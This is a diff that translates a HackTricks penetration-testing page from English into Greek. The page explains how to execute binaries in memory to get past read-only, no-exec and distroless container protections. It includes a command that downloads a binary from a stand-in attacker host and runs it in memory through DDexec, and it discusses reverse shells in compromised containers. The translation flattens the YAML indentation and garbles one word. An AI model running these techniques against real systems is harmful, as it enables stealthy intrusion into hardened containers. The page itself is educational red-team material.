@@ -1,78 +1,70 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# Παράκαμψη προστασιών FS: μόνο για ανάγνωση / χωρίς εκτέλεση / Distroless
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+## Βίντεο
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
-
-{% embed url="https://www.stmcyber.com/careers" %}
-
-## Videos
-
-In the following videos you can find the techniques mentioned in this page explained more in depth:
+Στα παρακάτω βίντεο μπορείτε να βρείτε τις τεχνικές που αναφέρονται σε αυτή τη σελίδα εξηγημένες πιο αναλυτικά:
 
 - [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
 - [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
 
-## read-only / no-exec scenario
+## σενάριο μόνο για ανάγνωση / χωρίς εκτέλεση
 
-It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
+Είναι όλο και πιο συνηθισμένο να βρίσκουμε μηχανές linux που είναι τοποθετημένες με **προστασία συστήματος αρχείων μόνο για ανάγνωση (ro)**, ειδικά σε κοντέινερ. Αυτό συμβαίνει επειδή η εκτέλεση ενός κοντέινερ με σύστημα αρχείων ro είναι τόσο εύκολη όσο η ρύθμιση του **`readOnlyRootFilesystem: true`** στο `securitycontext`:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine-pod
+name: alpine-pod
 spec:
-  containers:
-  - name: alpine
-    image: alpine
-    securityContext:
+containers:
+- name: alpine
+image: alpine
+securityContext:
 <strong>      readOnlyRootFilesystem: true
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
+Ωστόσο, ακόμη και αν το σύστημα αρχείων είναι τοποθετημένο ως ro, το **`/dev/shm`** θα είναι ακόμα εγ writable, οπότε είναι ψευδές ότι δεν μπορούμε να γράψουμε τίποτα στο δίσκο. Ωστόσο, αυτός ο φάκελος θα είναι **τοποθετημένος με προστασία χωρίς εκτέλεση**, οπότε αν κατεβάσετε ένα δυαδικό αρχείο εδώ **δεν θα μπορείτε να το εκτελέσετε**.
 
 > [!WARNING]
-> From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
+> Από την οπτική γωνία της κόκκινης ομάδας, αυτό καθιστά **περίπλοκο να κατεβάσετε και να εκτελέσετε** δυαδικά αρχεία που δεν είναι ήδη στο σύστημα (όπως backdoors ή enumerators όπως το `kubectl`).
 
-## Easiest bypass: Scripts
+## Ευκολότερη παράκαμψη: Σενάρια
 
-Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
+Σημειώστε ότι ανέφερα δυαδικά αρχεία, μπορείτε να **εκτελέσετε οποιοδήποτε σενάριο** εφόσον ο διερμηνέας είναι μέσα στη μηχανή, όπως ένα **shell script** αν το `sh` είναι παρόν ή ένα **python** **script** αν το `python` είναι εγκατεστημένο.
 
-However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
+Ωστόσο, αυτό δεν είναι αρκετό για να εκτελέσετε το δυαδικό σας backdoor ή άλλα δυαδικά εργαλεία που μπορεί να χρειαστεί να εκτελέσετε.
 
-## Memory Bypasses
+## Παράκαμψη Μνήμης
 
-If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
+Αν θέλετε να εκτελέσετε ένα δυαδικό αρχείο αλλά το σύστημα αρχείων δεν το επιτρέπει, ο καλύτερος τρόπος να το κάνετε είναι να **το εκτελέσετε από τη μνήμη**, καθώς οι **προστασίες δεν ισχύουν εκεί**.
 
-### FD + exec syscall bypass
+### Παράκαμψη FD + exec syscall
 
-If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
+Αν έχετε μερικούς ισχυρούς κινητήρες σεναρίων μέσα στη μηχανή, όπως **Python**, **Perl** ή **Ruby**, μπορείτε να κατεβάσετε το δυαδικό αρχείο για να το εκτελέσετε από τη μνήμη, να το αποθηκεύσετε σε έναν περιγραφέα αρχείου μνήμης (`create_memfd` syscall), ο οποίος δεν θα προστατεύεται από αυτές τις προστασίες και στη συνέχεια να καλέσετε μια **`exec` syscall** υποδεικνύοντας τον **fd ως το αρχείο προς εκτέλεση**.
 
-For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
+Για αυτό μπορείτε εύκολα να χρησιμοποιήσετε το έργο [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Μπορείτε να του περάσετε ένα δυαδικό αρχείο και θα δημιουργήσει ένα σενάριο στη δηλωμένη γλώσσα με το **δυαδικό αρχείο συμπιεσμένο και b64 κωδικοποιημένο** με τις οδηγίες να **αποκωδικοποιήσετε και να αποσυμπιέσετε** σε έναν **fd** που δημιουργείται καλώντας την `create_memfd` syscall και μια κλήση στην **exec** syscall για να το εκτελέσετε.
 
 > [!WARNING]
-> This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
+> Αυτό δεν λειτουργεί σε άλλες γλώσσες σεναρίων όπως το PHP ή το Node επειδή δεν έχουν καμία **προεπιλεγμένη μέθοδο για να καλέσουν ωμές syscalls** από ένα σενάριο, οπότε δεν είναι δυνατό να καλέσετε την `create_memfd` για να δημιουργήσετε τον **περιγραφέα μνήμης** για να αποθηκεύσετε το δυαδικό αρχείο.
 >
-> Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
+> Επιπλέον, η δημιουργία ενός **κανονικού fd** με ένα αρχείο στο `/dev/shm` δεν θα λειτουργήσει, καθώς δεν θα σας επιτραπεί να το εκτελέσετε επειδή η **προστασία χωρίς εκτέλεση** θα ισχύει.
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) είναι μια τεχνική που σας επιτρέπει να **τροποποιήσετε τη μνήμη της δικής σας διαδικασίας** αντικαθιστώντας το **`/proc/self/mem`**.
 
-Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
+Επομένως, **ελέγχοντας τον κώδικα συναρμολόγησης** που εκτελείται από τη διαδικασία, μπορείτε να γράψετε ένα **shellcode** και να "μεταλλάξετε" τη διαδικασία για να **εκτελέσετε οποιονδήποτε αυθαίρετο κώδικα**.
 
 > [!TIP]
-> **DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
-
+> **DDexec / EverythingExec** θα σας επιτρέψει να φορτώσετε και να **εκτελέσετε** το δικό σας **shellcode** ή **οποιοδήποτε δυαδικό** από **μνήμη**.
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
-For more information about this technique check the Github or:
+Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, ελέγξτε το Github ή:
 
 {{#ref}}
 ddexec.md
@@ -80,45 +72,40 @@ ddexec.md
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
+[**Memexec**](https://github.com/arget13/memexec) είναι το φυσικό επόμενο βήμα του DDexec. Είναι ένα **DDexec shellcode demonised**, οπότε κάθε φορά που θέλετε να **τρέξετε ένα διαφορετικό δυαδικό αρχείο**, δεν χρειάζεται να επανεκκινήσετε το DDexec, μπορείτε απλά να τρέξετε το memexec shellcode μέσω της τεχνικής DDexec και στη συνέχεια να **επικοινωνήσετε με αυτόν τον δαίμονα για να περάσετε νέα δυαδικά αρχεία για φόρτωση και εκτέλεση**.
 
-You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Μπορείτε να βρείτε ένα παράδειγμα για το πώς να χρησιμοποιήσετε το **memexec για να εκτελέσετε δυαδικά αρχεία από ένα PHP reverse shell** στο [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+Με παρόμοιο σκοπό με το DDexec, η τεχνική [**memdlopen**](https://github.com/arget13/memdlopen) επιτρέπει έναν **ευκολότερο τρόπο φόρτωσης δυαδικών αρχείων** στη μνήμη για να τα εκτελέσετε αργότερα. Θα μπορούσε να επιτρέψει ακόμη και τη φόρτωση δυαδικών αρχείων με εξαρτήσεις.
 
 ## Distroless Bypass
 
-### What is distroless
+### Τι είναι το distroless
 
-Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
+Τα distroless containers περιέχουν μόνο τα **απαραίτητα ελάχιστα στοιχεία για να τρέξει μια συγκεκριμένη εφαρμογή ή υπηρεσία**, όπως βιβλιοθήκες και εξαρτήσεις χρόνου εκτέλεσης, αλλά αποκλείουν μεγαλύτερα στοιχεία όπως διαχειριστές πακέτων, shell ή συστήματα βοηθητικών προγραμμάτων.
 
-The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+Ο στόχος των distroless containers είναι να **μειώσουν την επιφάνεια επίθεσης των containers εξαλείφοντας περιττά στοιχεία** και ελαχιστοποιώντας τον αριθμό των ευπαθειών που μπορούν να εκμεταλλευτούν.
 
 ### Reverse Shell
 
-In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+Σε ένα distroless container μπορεί να **μην βρείτε καν `sh` ή `bash`** για να αποκτήσετε μια κανονική shell. Δεν θα βρείτε επίσης δυαδικά αρχεία όπως `ls`, `whoami`, `id`... όλα όσα συνήθως τρέχετε σε ένα σύστημα.
 
 > [!WARNING]
-> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
+> Επομένως, **δεν θα** μπορείτε να αποκτήσετε μια **reverse shell** ή να **καταγράψετε** το σύστημα όπως συνήθως κάνετε.
 
-However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
-
-> [!TIP]
-> Using the scripting language you could **enumerate the system** using the language capabilities.
-
-If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+Ωστόσο, αν το παραβιασμένο container τρέχει για παράδειγμα μια εφαρμογή flask, τότε το python είναι εγκατεστημένο, και επομένως μπορείτε να αποκτήσετε μια **Python reverse shell**. Αν τρέχει node, μπορείτε να αποκτήσετε μια Node rev shell, και το ίδιο με σχεδόν οποιαδήποτε **γλώσσα scripting**.
 
 > [!TIP]
-> However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+> Χρησιμοποιώντας τη γλώσσα scripting, θα μπορούσατε να **καταγράψετε το σύστημα** χρησιμοποιώντας τις δυνατότητες της γλώσσας.
 
-You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Αν δεν υπάρχουν **προστασίες `read-only/no-exec`**, θα μπορούσατε να εκμεταλλευτείτε τη reverse shell σας για να **γράψετε στο σύστημα αρχείων τα δυαδικά σας αρχεία** και να **τα εκτελέσετε**.
 
-<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+> [!TIP]
+> Ωστόσο, σε αυτού του είδους τα containers, αυτές οι προστασίες συνήθως θα υπάρχουν, αλλά θα μπορούσατε να χρησιμοποιήσετε τις **προηγούμενες τεχνικές εκτέλεσης μνήμης για να τις παρακάμψετε**.
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+Μπορείτε να βρείτε **παραδείγματα** για το πώς να **εκμεταλλευτείτε κάποιες ευπάθειες RCE** για να αποκτήσετε **reverse shells** γλωσσών scripting και να εκτελέσετε δυαδικά αρχεία από τη μνήμη στο [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-{% embed url="https://www.stmcyber.com/careers" %}
 
 {{#include ../../../banners/hacktricks-training.md}}
